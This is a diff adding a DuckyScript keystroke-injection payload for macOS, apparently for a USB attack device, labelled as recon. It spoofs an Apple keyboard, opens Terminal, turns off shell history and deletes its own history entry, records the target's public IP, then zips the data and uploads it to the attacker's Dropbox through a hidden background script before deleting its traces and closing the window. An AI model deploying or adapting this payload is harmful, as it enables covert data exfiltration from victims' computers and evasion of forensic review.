@@ -1,0 +1,68 @@
+REM Description: Uses Mac Terminals config.me command to do a PUBLIC I.P. lookup 
+REM Saves the data to a folder on the desktop
+REM Then proceeds to upload the I.P. data to your API dropbox 
+REM removes the folder on the desktop and closes the terminal
+REM Replace <API access token here> with your actual Dropbox API access token 
+
+
+
+REM Title: Public I.P. Finder to Dropbox
+REM Author: Narsty
+REM Target: MacOS 
+REM Version: 1.0
+REM Category: Recon
+
+
+
+ID 05ac:021e Apple:Keyboard
+DELAY 500
+GUI SPACE
+DELAY 500
+STRING terminal
+DELAY 1000
+ENTER
+DELAY 500
+STRING echo -e "export HISTCONTROL=ignorespace\nunset HISTFILE" >> ~/.bashrc && source ~/.bashrc && exec bash
+DELAY 500
+ENTER
+DELAY 500
+STRING history -d $(history | tail -n 2 | head -n 1 | awk '{ print $1 }')
+DELAY 500
+ENTER
+DELAY 500
+ENTER
+DELAY 2000
+STRING  public_ip=$(curl -s ifconfig.me);
+DELAY 500
+ENTER
+DELAY 3000
+STRING  mkdir ~/Desktop/"Public I.P. Data" && echo "Your TARGETS IP address is: $public_ip" > ~/Desktop/"Public I.P. Data"/public_ip.txt
+DELAY 1000
+ENTER
+DELAY 500
+STRING  echo 'cd ~/Desktop/"Public I.P. Data" && zip -r backup.zip . && curl -X POST https://content.dropboxapi.com/2/files/upload -H "Authorization: Bearer <Your API token Here>" -H "Dropbox-API-Arg: {\"path\": \"/Backup/backup.zip\",\"mode\": \"add\",\"autorename\": true,\"mute\": false}" -H "Content-Type: application/octet-stream" --data-binary @backup.zip' > upload.sh
+DELAY 2000
+ENTER
+DELAY 500
+STRING  chmod +x upload.sh
+ENTER
+DELAY 500
+STRING  nohup ./upload.sh >/dev/null 2>&1 &
+DELAY 500
+ENTER
+DELAY 1000
+STRING  rm upload.sh
+DELAY 500
+ENTER
+DELAY 500
+STRING  rm -rf ~/Desktop/"Public I.P. Data"
+DELAY 500
+ENTER
+DELAY 500
+STRING  CLEAR
+DELAY 500
+ENTER
+DELAY 500
+GUI w
+DELAY 500
+ENTER
